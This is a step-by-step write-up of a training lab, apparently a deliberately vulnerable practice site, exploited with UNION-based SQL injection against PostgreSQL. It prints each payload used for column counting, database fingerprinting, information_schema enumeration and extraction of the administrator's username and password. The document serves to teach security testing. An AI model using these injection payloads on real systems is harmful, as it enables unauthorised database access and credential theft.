SQL INJECTION LAB

Database Enumeration & Credential Extraction

A practical investigation of a UNION-based SQL injection vulnerability, from column enumeration and database identification to table discovery, column enumeration and credential extraction.

✓

End Goals

  • Determine the table containing usernames and passwords.
  • Determine the relevant username and password columns.
  • Output the contents of the target table.
  • Identify the administrator credentials and use them to complete the lab.
1

Determine the Number of Columns

The first step was determining how many columns were returned by the original SQL query. This is important for a UNION-based SQL injection because the injected SELECT statement must return the same number of columns as the original query.

I started with the ORDER BY technique and incremented the column number until the application returned an error.

Payload 01
' ORDER BY 1--
Payload 02
' ORDER BY 2--

The next iteration produced an error:

Payload 03 — Error
' ORDER BY 3--
Observation:
ORDER BY 3 generated an error, indicating that the query does not return a third column. Therefore, the original query returns 2 columns.

Alternative Method — UNION NULL Testing

I also tested the number of columns using UNION SELECT NULL. The number of NULL values can be increased until the UNION query is accepted. 

' UNION SELECT NULL--

After iterating through the number of columns, this payload returned a successful response: 

' UNION SELECT NULL, NULL--
Result:
The application accepts a UNION query containing 2 columns.
Key Lesson: ORDER BY enumeration and UNION SELECT NULL testing are both useful techniques for determining the number of columns returned by the original query.
2

Determine the Datatypes of the Columns

After determining that the query returned two columns, the next step was identifying which columns could accept text values. 

' UNION SELECT NULL, NULL--
Result:
Both positions accepted text-compatible values, meaning either column could potentially be used to display extracted database information.
3

Identify the Database Management System

The next step was identifying the database management system (DBMS). This matters because database enumeration syntax differs between database technologies.

Microsoft SQL Server Test

' UNION SELECT @@version, NULL--

The expected result for Microsoft SQL Server was not returned, so Microsoft SQL Server was ruled out for this lab.

PostgreSQL Test

' UNION SELECT version(), NULL--
Result:
The response confirmed that the target database is PostgreSQL.
4

Enumerate Database Tables

After identifying PostgreSQL, I queried information_schema.tables to enumerate table names. 

' UNION SELECT table_name, NULL
```

FROM information_schema.tables--
```

The query returned table names available to the database user. One of the relevant tables identified was: 

users_bbwece
TABLE IDENTIFIED
Finding:
users_bbwece appeared to contain user account information.
5

Enumerate the Table Columns

I then queried information_schema.columns and restricted the result to the identified users table. 

' UNION SELECT column_name, NULL
```

FROM information_schema.columns
WHERE table_name = 'users_bbwece'--
```

The relevant columns returned were:

Purpose Column
Username username_srdqvt
Password password_zpnttm
Finding:
The target table contains separate columns for usernames and passwords.
6

Extract the Usernames and Passwords

With the table and column names identified, I constructed a UNION query to retrieve the username and password values. 

' UNION SELECT username_srdqvt, password_zpnttm
```

FROM users_bbwece--
```

The response displayed the following administrator account:

Username Password
administrator dy6nlbnmn9cfv2h2ip43
Final Result:
The administrator credentials were successfully retrieved from the vulnerable database, completing the database enumeration portion of the lab.

Key Takeaways

01 — Column Enumeration Determine the number of columns before attempting a UNION-based attack.
02 — NULL Testing NULL values are useful for testing UNION column compatibility.
03 — DBMS Identification Identifying the DBMS helps determine the appropriate enumeration syntax.
04 — Information Schema PostgreSQL exposes useful metadata through information_schema.
05 — Structured Enumeration Table discovery should come before attempting to extract useful data.
06 — Attack Chain Each discovery provided the information required for the next step.
